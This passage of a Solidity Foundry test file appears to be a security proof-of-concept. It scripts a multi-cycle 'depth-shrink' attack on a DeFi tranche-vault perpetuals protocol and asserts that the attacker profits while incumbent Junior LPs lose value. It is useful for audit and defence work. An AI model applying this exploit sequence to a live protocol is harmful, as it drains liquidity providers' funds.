        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(trader, block.timestamp, size, isClose, side)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        id = OrderRouter(payable(address(router))).commitOrder(req);
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        uint64 id = _commit(trader, side, size, margin, isClose);
        bytes[] memory data = _pythData(P0);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _settleEpoch() internal {
        bytes[] memory d = _pythData(P0);
        vm.prank(ATK_TR);
        router.settleLpEpoch(d);
    }

    function _vpi(
        address a
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _size(
        address a
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _incJ() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function _incS() internal view returns (uint256) {
        return seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _atkWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATK_LP) + clearinghouse.balanceAssets(ATK_TR)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATK_LP));
    }

    function _nextTarget() internal view returns (uint256 T) {
        T = ((block.timestamp + 15 minutes) / 1 hours + 1) * 1 hours;
    }

    function _deposit(
        uint256 assets
    ) internal returns (uint256 id) {
        uint256 bal = settlementToken.balanceOf(ATK_LP);
        if (bal < assets) settlementToken.mint(ATK_LP, assets - bal);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), assets);
        id = juniorVault.requestDeposit(assets, ATK_LP, ATK_LP);
        vm.stopPrank();
    }

    /// Shares the attacker must leave in Junior so the release ratio cap (junior >= exposure*2000/8000) can fund the rest.
    function _redeemableShares() internal view returns (uint256 shares) {
        uint256 exposure = pool.seniorPrincipal() > pool.seniorHighWaterMark()
            ? pool.seniorPrincipal()
            : pool.seniorHighWaterMark();
        uint256 required = (exposure * 2000) / 8000;
        required = required + required / 200 + 500_000e6; // 0.5% + 0.5M safety margin (mark noise, carry, coupon)
        uint256 inc = _incJ();
        uint256 keepAssets = required > inc ? required - inc : 0;
        uint256 bal = juniorVault.balanceOf(ATK_LP);
        uint256 keep = juniorVault.convertToShares(keepAssets);
        shares = bal > keep ? bal - keep : 0;
    }

    // ------------------------------------------------------------------ the campaign

    /// withHedge == false is the CONTROL: identical LP schedule, identical persistent position A, no hedge B.
    function _campaign(
        uint256 dep,
        uint256 X,
        uint256 cycles,
        bool withHedge
    ) internal returns (Run memory run) {
        run.incJStart = _incJ();
        run.incSStart = _incS();
        run.atkStart = clearinghouse.balanceAssets(ATK_TR);
        uint256 treasury0 = settlementToken.balanceOf(PROTOCOL_TREASURY_ACCOUNT)
            + clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);

        // bootstrap: flat deposit, then open persistent A (skew-increasing from 0, at D_big)
        uint256 T = _nextTarget();
        vm.warp(T - 10 minutes);
        _refresh(P0);
        run.minted += dep;
        uint256 depId = _deposit(dep);
        vm.warp(T - 1);
        _settleEpoch();
        vm.prank(ATK_LP);
        juniorVault.claimDepositShares(depId);
        _trade(ATK_TR, CfdTypes.Side.LONG, X, X / 1e12 * 200 / 10_000, false);
        console2.log("A opened: VPI charge / depth", uint256(_vpi(ATK_TR)), pool.totalAssets());

        vm.warp(T + 1 hours + 1);
        _refresh(P0);
        uint256 rs = _redeemableShares();
        vm.prank(ATK_LP);
        uint256 redId = juniorVault.requestRedeem(rs, ATK_LP, ATK_LP);
        uint256 E = pool.lpEpochStart(redId);

        for (uint256 i; i < cycles; ++i) {
            // (1) exit at E
            vm.warp(E - 1);
            _settleEpoch();
            uint256 claimable = juniorVault.claimableRedeemRequest(redId, ATK_LP);
            assertGt(claimable, 0, "redeem funded");
            vm.prank(ATK_LP);
            juniorVault.claimRedeem(redId, claimable, ATK_LP, ATK_LP);
            uint256 dSmall = pool.totalAssets();

            // (2) hedge B at the shrunk depth (skew-reducing open -> rebate)
            if (withHedge) {
                _trade(TR2, CfdTypes.Side.SHORT, X, X / 1e12 * 200 / 10_000, false);
            }
            int256 rB = _vpi(TR2);

            // (3) deposit; settles at E+1h
            uint256 bal = settlementToken.balanceOf(ATK_LP);
            if (bal < dep) run.minted += dep - bal;
            depId = _deposit(dep);
            vm.warp(E + 1 hours - 1);
            _settleEpoch();
            vm.prank(ATK_LP);
            juniorVault.claimDepositShares(depId);
            uint256 dBig = pool.totalAssets();

            // (4) close B at D_big: clamp forces repayment of exactly r
            if (withHedge) {
                uint256 trBefore = clearinghouse.balanceAssets(TR2);
                _trade(TR2, CfdTypes.Side.SHORT, X, 0, true);
                assertEq(_size(TR2), 0, "B flat");
                console2.log("cycle / D_small / D_big", i, dSmall, dBig);
                console2.log("   B open rebate r (abs) / B close trader delta", uint256(-rB));
                console2.logInt(int256(clearinghouse.balanceAssets(TR2)) - int256(trBefore));
            }
            console2.log("   incumbent Junior / Senior value", _incJ(), _incS());

            // (5) redeem request after the activation cooldown -> next exit at E+3h
            vm.warp(E + 2 hours + 1);
            _refresh(P0);
            rs = _redeemableShares();
            vm.prank(ATK_LP);
            redId = juniorVault.requestRedeem(rs, ATK_LP, ATK_LP);
            E = pool.lpEpochStart(redId);
        }
        // final exit, then close A (its refundable charge is refunded by whoever is LP then)
        vm.warp(E - 1);
        _settleEpoch();
        uint256 c2 = juniorVault.claimableRedeemRequest(redId, ATK_LP);
        vm.prank(ATK_LP);
        juniorVault.claimRedeem(redId, c2, ATK_LP, ATK_LP);
        _trade(ATK_TR, CfdTypes.Side.LONG, X, 0, true);
        assertEq(_size(ATK_TR), 0, "A flat");

        run.incJEnd = _incJ();
        run.incSEnd = _incS();
        run.keptShares = juniorVault.balanceOf(ATK_LP);
        run.atkEnd = _atkWealth() + clearinghouse.balanceAssets(TR2);
        run.atkStart += clearinghouse.balanceAssets(TR2) * 0 + 3_000_000e6 + run.minted; // TR2 funded 3M in setUp
        run.seniorPrincipalEnd = pool.seniorPrincipal();
        run.seniorHwmEnd = pool.seniorHighWaterMark();
        run.treasuryGain = settlementToken.balanceOf(PROTOCOL_TREASURY_ACCOUNT)
            + clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasury0;
    }

    function _logRun(string memory tag, Run memory r) internal pure {
        console2.log("=====", tag);
        console2.log("  incumbent Junior start / end", r.incJStart, r.incJEnd);
        console2.log("  incumbent Senior start / end", r.incSStart, r.incSEnd);
        console2.log("  attacker wealth start / end (incl. kept Junior shares at NAV)", r.atkStart, r.atkEnd);
        console2.log("  attacker kept (ratio-locked) Junior shares", r.keptShares);
        console2.log("  seniorPrincipal / HWM end", r.seniorPrincipalEnd, r.seniorHwmEnd);
        console2.log("  treasury fee gain", r.treasuryGain);
    }

    function _attackVsControl(uint256 dep, uint256 X, uint256 cycles) internal returns (Run memory a, Run memory c) {
        uint256 snap = vm.snapshotState();
        c = _campaign(dep, X, cycles, false);
        vm.revertToState(snap);
        a = _campaign(dep, X, cycles, true);
        _logRun("CONTROL (persistent A, no hedge)", c);
        _logRun("ATTACK (persistent A + depth-shrink hedge B)", a);
        int256 edge = (int256(a.atkEnd) - int256(a.atkStart)) - (int256(c.atkEnd) - int256(c.atkStart));
        int256 incLoss = int256(c.incJEnd) - int256(a.incJEnd);
        console2.log("ATTACKER EDGE vs control");
        console2.logInt(edge);
        console2.log("INCUMBENT JUNIOR LOSS vs control");
        console2.logInt(incLoss);
        console2.log("incumbent Junior loss vs control, bps of start", uint256(incLoss) * 10_000 / a.incJStart);
        console2.log("SENIOR value diff vs control");
        console2.logInt(int256(a.incSEnd) - int256(c.incSEnd));
        assertGt(edge, 0, "attacker net-profitable after all fees");
        assertGt(incLoss, 0, "incumbent Junior pays");
        assertGe(a.incSEnd, a.incSStart, "Senior not impaired");
        assertApproxEqAbs(a.incSEnd, c.incSEnd, 5e6, "Senior unaffected vs control");
        assertGe(a.seniorPrincipalEnd, a.seniorHwmEnd, "no senior impairment (principal >= HWM)");
    }

    // ------------------------------------------------------------------ tests

    /// One cycle at release scale: attacker 75M, persistent A = 45M long (36% of D_big 125M; exit needs D_small >= ~X).
    function test_P3_depthShrink_oneCycle() public {
        _attackVsControl(75_000_000e6, 45_000_000e18, 1);
    }

    /// 8 cycles x 3h = one day of cycling at release scale.
    function test_P3_depthShrink_oneDay() public {
        (Run memory a,) = _attackVsControl(75_000_000e6, 45_000_000e18, 8);
        assertLt(a.incJEnd, a.incJStart * 90 / 100, "incumbent Junior lost >10% in one day");
    }

    /// 24 cycles = 3 days; shows the ratio-cap lock and that Senior remains whole.
    /// Starts Monday 2024-03-11 01:00 UTC so the 72h run stays inside the weekday (non-FAD/frozen) window; over the
    /// weekend frozen window deposits are unavailable (observed TrancheVault__DepositsUnavailable), so cycling pauses.
    function test_P3_depthShrink_threeDays() public {
        vm.warp(1_710_118_800);
        _refresh(P0);
        (Run memory a,) = _attackVsControl(75_000_000e6, 45_000_000e18, 24);
        assertGt(a.keptShares, 0, "release ratio cap locks part of the attacker in Junior");
    }

    /// Smaller attacker (f ~0.5 at entry): 10M deposit, A = 18M (36% of 60M), D_small 50M.
    function test_P3_depthShrink_smallCapital() public {
        _attackVsControl(10_000_000e6, 18_000_000e18, 1);
    }

    // -------- (b)/(d): trader side can never net a negative lifetime VPI (refund <= charge), any ordering

    function _twoLegRoundTrip(bool closeLongFirst) internal returns (int256 net) {
        uint256 a0 = clearinghouse.balanceAssets(ATK_TR) + clearinghouse.balanceAssets(TR2);
        uint256 X = 15_000_000e18;
        _trade(ATK_TR, CfdTypes.Side.LONG, X, 300_000e6, false); // +c
        _trade(TR2, CfdTypes.Side.SHORT, X, 300_000e6, false); // -c (skew back to 0)
        console2.log("two-leg: vpi long / short");
        console2.logInt(_vpi(ATK_TR));
        console2.logInt(_vpi(TR2));
        if (closeLongFirst) {
            _trade(ATK_TR, CfdTypes.Side.LONG, X, 0, true);
            _trade(TR2, CfdTypes.Side.SHORT, X, 0, true);
        } else {
            _trade(TR2, CfdTypes.Side.SHORT, X, 0, true);
            _trade(ATK_TR, CfdTypes.Side.LONG, X, 0, true);
        }
        net = int256(clearinghouse.balanceAssets(ATK_TR) + clearinghouse.balanceAssets(TR2)) - int256(a0);
    }

    function test_P3_twoLegs_noTraderProfit() public {
        uint256 snap = vm.snapshotState();
        int256 n1 = _twoLegRoundTrip(true);
        vm.revertToState(snap);
        int256 n2 = _twoLegRoundTrip(false);
        console2.log("two-leg trader net, close-long-first / close-short-first");
        console2.logInt(n1);
        console2.logInt(n2);
        int256 fees = int256(4 * 2 * 15_000_000e6 * 2 / 10_000); // 4 legs x 4 bps x 15M
        assertLe(n1, -fees + 2e6, "no trader-side VPI profit (A first)");
        assertLe(n2, -fees + 2e6, "no trader-side VPI profit (B first)");
    }

}

```

